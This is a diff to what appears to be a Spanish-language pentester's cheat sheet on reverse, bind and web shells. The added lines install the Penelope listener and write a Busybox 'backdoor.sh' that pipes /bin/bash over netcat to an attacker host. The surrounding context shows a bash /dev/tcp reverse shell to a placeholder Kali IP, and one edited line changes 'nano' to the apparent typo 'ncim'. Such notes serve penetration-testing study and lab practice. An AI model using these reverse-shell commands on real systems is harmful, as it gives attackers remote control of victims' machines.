@@ -9,6 +9,7 @@ Tags: #ReverseShell #BindShell #ForwardShell #Webshell #Netcat #PowerShell #PHP 
 * [PowerShell for Pentesters](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)
 * [P0wny Shell Webshell](https://github.com/flozz/p0wny-shell/blob/master/shell.php)
 * [Invoke-PowerShellTcp.ps1](https://gist.github.com/PwnPeter/cb3becedd8b8ce1f80e189760ddeb047)
+* [Penelope](https://github.com/brightio/penelope)
 
 ## TIPOS
 ```
@@ -28,6 +29,9 @@ Forward Shell  → via mkfifo → cuando reverse y bind están bloqueados por fi
 ## 1. LISTENERS EN KALI
 
 ```bash
+❯ sudo apt install penelope    # Instalar la tool (Mejor hasta ahora)
+❯ penelope -p 443     # Recibir la revershell 
+
 ❯ nc -nlvp 443
 # Linux → shell básica
 
@@ -44,6 +48,16 @@ Forward Shell  → via mkfifo → cuando reverse y bind están bloqueados por fi
 ```
 
 ## 2. REVERSE SHELLS — LINUX
+
+## Busybox
+```bash 
+❯ which busybox       # Verificar si esta instalado 
+❯ busybox --version
+
+❯ nvim backdoor.sh 
+	#!/bin/bash
+	busybox nc IP_Kali 4444 -e /bin/bash   
+```
 
 ### Bash
 ```bash
@@ -310,7 +324,7 @@ echo "PHP_EXEC_OK";
 ### PHP — Via curl + index.html para Kali 
 ```bash
 # En Kali → crear index.html con el payload
-❯ nano index.html
+❯ ncim index.html
 #!/bin/bash
 bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'
 
